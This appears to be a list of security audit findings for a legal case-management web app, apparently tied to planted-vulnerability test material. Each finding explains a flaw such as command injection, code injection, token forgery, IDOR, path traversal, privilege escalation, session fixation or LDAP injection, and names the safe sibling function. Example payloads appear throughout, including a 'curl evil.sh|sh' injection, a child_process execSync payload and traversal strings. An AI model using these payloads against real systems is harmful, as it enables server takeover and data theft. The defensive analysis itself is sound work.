extra.message: convertMatterDocument() builds a shell command string with execSync(`pandoc ${sourcePath} -o ${outPath} -t ${targetFormat}`) using sourceFilename/targetFormat taken directly from request.formData() in app/routes/_app.documents.tsx (lines 20-24), restricted only to firm_admin/attorney/paralegal roles. Neither value is sanitized or allowlisted, so an authenticated user can inject shell metacharacters (e.g. filename=`a; curl evil.sh|sh #`) to execute arbitrary OS commands as the server process. The sibling function renderCaseSummary() in the same file (lines 24-32) shows the safe pattern: an allowlisted format and spawn() with an argv array and shell:false.

estimateMatterFee() compiles an attacker-supplied string directly into executable JavaScript via `new Function("params", `return (${formula});`)`. It is invoked from app/routes/_app.matters.new.tsx (lines 34-44) with `formula` taken straight from the unauthenticated GET query string `feeFormula` (only the page itself requires firm_admin/attorney role, but this is a GET loader executed on every page view). A payload such as `(()=>{require('child_process').execSync('...')})()` or any expression reaching global scope executes arbitrary server-side code.

resolveHandoffToken() decodes the client-message handoff token's payload and, when a signature is present but does NOT match the expected HMAC, still returns the (forged) payload instead of rejecting it (`if (signature !== expected) { return payload; }`). It's used unauthenticated-token-wise in app/routes/_app.client.messages.tsx (lines 19-26): any logged-in user (any role, via the parent _app.tsx auth check) can craft `?handoff=<base64url of {matterId:'<any-id>',clientId:..,exp:9999999999999}>.garbage` and the loader will fetch and display that matter's approved messages, bypassing per-matter/per-client authorization entirely. Contrast with the correctly-implemented verifyFilingReceipt() in the same file, which uses crypto.timingSafeEqual and rejects any mismatch.

extra.message: The 'update_task_status' action intent authorizes the request against the matter identified by params.id (the URL), but then updates a Task record looked up only by `taskId` from the form body with no `matterId` filter: `prisma.task.update({ where: { id: taskId }, data: updateTaskData })`. Any attorney/paralegal assigned to matter A can POST intent=update_task_status with a taskId belonging to matter B (which they aren't assigned to) to change that task's status/completedAt. Contrast with 'update_doc_visibility' (lines 402-416) and 'update_deadline_status' (lines 455-469) in the same file, which correctly scope the lookup via `where: { id, matterId }` before updating.

extra.message: The 'approve_message' action intent updates a Message record looked up only by `messageId` from the form body, with no `matterId` scoping: `prisma.message.update({ where: { id: messageId }, data: { status: 'approved', ... } })`. An attorney/paralegal/admin with access to any single matter can approve a draft message belonging to a different matter they have no assignment to, exposing that message to that matter's client (draft messages become client-visible once status='approved', per the loader's msgWhere filter at lines 133-146).

extra.message: exportCaseBinder() joins the user-supplied `label` directly into a filesystem path with no sanitization: `path.join(BINDER_DIR, `${label}.json`)` followed by fs.writeFileSync. It's invoked from app/routes/_app.matters.$id.tsx (lines 520-523, 'export_binder' intent) with `label` taken verbatim from formData.get('label'). A value like `../../../../tmp/pwned` (or an absolute path) escapes BINDER_DIR and writes attacker-influenced JSON content to an arbitrary filesystem location writable by the process. Contrast with saveIntakeTemplate() in the same file (line 49), which correctly calls path.basename(templateName) before constructing the path.

applyDirectoryAccessGrants(), invoked from app/routes/_app.admin.import-export.tsx (lines 238-239) as part of a firm_admin-triggered bulk directory-sync import, promotes a user to firm_admin if `row.role == 'firm_admin' || (result.access && grantLevel >= 5)`. `grantLevel` comes from `parseInt(row.level)` with no radix and no integer validation, and `result.access` (currently always the string "0", per fetchDirectoryAccessResult) is truthy in JS, so any imported CSV/row can be crafted (e.g. level='5abc') to satisfy the condition and grant firm_admin to an arbitrary email. The file's own applyDirectoryAccessGrantsReviewed() (lines 46-58) demonstrates the intended safe check (`===`, explicit radix, Number.isInteger, strict boolean), confirming applyDirectoryAccessGrants is the vulnerable path that remains wired into the live route.

resumeMatterIntakeDraft() JSON.parses an attacker-controlled cookie (`matter_intake_draft`) and spreads the entire object into prisma.matter.create() with no schema validation: `const draft = JSON.parse(raw); return prisma.matter.create({ data: { ...draft, createdById } })`. It's invoked from app/routes/_app.matters.new.tsx (lines 55-57) for any firm_admin/attorney. Because the cookie is fully client-controlled and unvalidated, a user can set arbitrary Matter fields (clientId, attorneyId, status, sensitivity, etc.) that a normal form submission would otherwise constrain, e.g. attaching a new matter to any clientId in the system. Contrast with resumeTaskTemplateDraft() in the same file (lines 30-38), which validates the parsed draft against taskSchema before use.

extra.message: activateDelegateAccess(), used by app/routes/delegate-access.$token.tsx to log in an invited co-counsel delegate, reuses whatever session the incoming request already carries (`const session = await getSession(request); session.set('userId', userId);`) instead of issuing a fresh session id. An attacker who plants a known session identifier on a victim's browser (classic session fixation) and lures them into redeeming a delegate-access invite link ends up sharing that pre-set session. The sibling function activateCoCounselAccess() (lines 88-96, same file) explicitly destroys the old session and mints a new one before attaching the user — its own comment states this is specifically to prevent a shared/previously-used browser from carrying over another session identifier — showing the fix was applied to one invite-redemption path but not the other.

findAttorneyByBarEmail() builds an LDAP search filter by directly interpolating the caller-supplied `email` into the filter string: `(&(objectClass=person)(mail=${email}))`, then passes it to directoryClient.search(). It's invoked from app/routes/_app.admin.users.tsx with the raw `linkEmail` form value. An input such as `*)(|(mail=*` alters the filter's boolean structure (classic LDAP injection), potentially widening the match beyond the intended single record. Contrast with queryEmployeeDirectory() in the same file (lines 82-87), which correctly escapes special characters via escapeDirectoryFilterValue() before building the filter.

runComplianceSummary() returns the raw exception message and full stack trace (`{ error: e.message, stack: e.stack, entityType }`) to the caller whenever the client-supplied renderContext value is present/truthy, instead of the generic error used otherwise. This leaks internal implementation details (file paths, query structure, library internals) to any client able to set that header/context value.

extra.message: verifyKioskOverviewSession() validates the HMAC signature but never checks `payload.exp` before returning the session as valid, so a kiosk overview token never expires once issued. The sibling function verifyKioskMatterListSession() (lines 36-44, same file) correctly checks `if (payload.exp < Date.now()) return null;` — verifyKioskOverviewSession omits that check, allowing a leaked/shared shared-kiosk token to grant indefinite access to a client's matter overview.

previewPracticeAreaNotice() compiles free-form, firm-admin-supplied template text with `Handlebars.compile(templateBody)` (no sandboxing, no noEscape restriction, default helpers enabled) and immediately executes it against merge data. Handlebars templates support helpers and prototype-touching constructs that have historically been used for template-injection/RCE gadgets; while this path is restricted to firm_admin (same-privilege), rendering untrusted template bodies through a full Handlebars compile is an unsafe sink compared to renderStandardMatterNotice() in the same file, which only ever compiles a fixed, firm-authored template string.

extra.message: submitCourtFiling() places the sensitive COURT_EFILING_KEY submitter credential directly into the URL query string (`?api_key=${apiKey}&...`) rather than in a header. URLs are commonly captured in server access logs, proxy logs, and browser/HTTP client history, so the credential can leak via any component that logs request URLs. syncBillingLedger() in the same file correctly passes its credential via an Authorization header instead.
